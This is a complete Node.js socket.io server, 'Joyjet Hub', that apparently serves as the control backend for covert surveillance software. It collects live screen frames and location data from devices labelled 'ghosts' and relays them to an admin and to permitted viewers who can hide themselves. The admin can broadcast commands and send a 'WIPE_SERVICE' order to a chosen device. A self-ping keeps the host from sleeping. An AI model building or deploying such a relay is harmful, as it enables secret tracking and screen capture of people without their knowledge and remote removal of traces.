const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const axios = require('axios');

const app = express();
const server = http.createServer(app);

// 1. PERFORMANCE CONFIG (100MB Buffer for Screen Stream)
const io = new Server(server, {
  maxHttpBufferSize: 1e8, 
  pingTimeout: 60000,
  cors: { origin: "*" }
});

// 2. VIEWER PERMISSIONS MAPPING (Update these names to match your users)
const viewerPermissions = {
    "Viewer_John": ["Ghost_Alpha", "Ghost_Beta", "Ghost_Gamma"],
    "Viewer_Sarah": ["Ghost_Delta", "Ghost_Epsilon"]
};

// 3. RENDER KEEP-ALIVE (Self-Ping every 10 mins)
const PUBLIC_URL = "https://joyjet-server.onrender.com";
let lastActiveTime = Date.now();

setInterval(async () => {
  try {
    await axios.get(PUBLIC_URL);
    console.log('Heartbeat: Server is awake.');
  } catch (err) {
    console.log('Heartbeat: Pulse sent.');
  }
}, 600000); 

// 4. CONNECTION HANDLING
let activeAdmin = null;
let viewers = new Map(); // socketId -> { name, hidden: false }
let ghosts = new Map();  // socketId -> { name }

io.on('connection', (socket) => {
  console.log('Node Linked:', socket.id);

  // --- LOGIN LOGIC ---

  socket.on('claim_admin', (data) => {
    activeAdmin = socket.id;
    socket.emit('role_assigned', { role: 'ADMIN', name: data.name });
    
    // Alert if server was asleep (> 15 mins)
    if (Date.now() - lastActiveTime > 900000) {
        socket.emit('system_alert', { msg: "Server waking up. Ghosts reconnecting..." });
    }
  });

  socket.on('claim_viewer', (data) => {
    viewers.set(socket.id, { name: data.name, hidden: false });
    socket.emit('role_assigned', { role: 'VIEWER', name: data.name });
  });

  socket.on('register_user', (data) => {
    ghosts.set(socket.id, { name: data.name });
    lastActiveTime = Date.now(); // Reset sleep timer
    io.emit('system_alert', { msg: `Node [${data.name}] is active.` });
    socket.emit('role_assigned', { role: 'GHOST', name: data.name });
  });

  // --- STEALTH & STATUS ---

  socket.on('toggle_visibility', (data) => {
    if (viewers.has(socket.id)) {
        let vData = viewers.get(socket.id);
        vData.hidden = data.hidden;
        viewers.set(socket.id, vData);
    }
  });

  // --- DATA RELAYS (Ghost -> Admin/Viewer) ---

  socket.on('screen_frame', (payload) => {
    // Payload should be { ghostName: "...", frame: "..." }
    
    // Admin gets everything
    if (activeAdmin) io.to(activeAdmin).emit('screen_frame', payload);
    
    // Targeted Relay for Viewers
    viewers.forEach((vData, vSocketId) => {
        if (!vData.hidden) {
            const allowed = viewerPermissions[vData.name] || [];
            if (allowed.includes(payload.ghostName)) {
                io.to(vSocketId).emit('screen_frame', payload);
            }
        }
    });
  });

  socket.on('ghost_location_data', (payload) => {
    // Admin gets everything
    if (activeAdmin) io.to(activeAdmin).emit('ghost_update', payload);
    
    // Targeted Relay for Viewers
    viewers.forEach((vData, vSocketId) => {
        const allowed = viewerPermissions[vData.name] || [];
        if (allowed.includes(payload.ghostName)) {
            io.to(vSocketId).emit('ghost_update', payload);
        }
    });
  });

  // --- COMMANDS ---

  // Admin Only: Wipe a specific Ghost
  socket.on('admin_wipe', (targetGhostId) => {
    if (socket.id === activeAdmin) {
        io.to(targetGhostId).emit('admin_command', 'WIPE_SERVICE');
        console.log(`WIPE issued for ${targetGhostId}`);
    }
  });

  // Admin Only: Global Command (START_LIVE, etc)
  socket.on('admin_command', (cmd) => {
    if (socket.id === activeAdmin) {
        socket.broadcast.emit('admin_command', cmd);
    }
  });

  socket.on('disconnect', () => {
    if (socket.id === activeAdmin) activeAdmin = null;
    viewers.delete(socket.id);
    ghosts.delete(socket.id);
  });
});

app.get('/', (req, res) => res.send('Joyjet Hub: Active'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
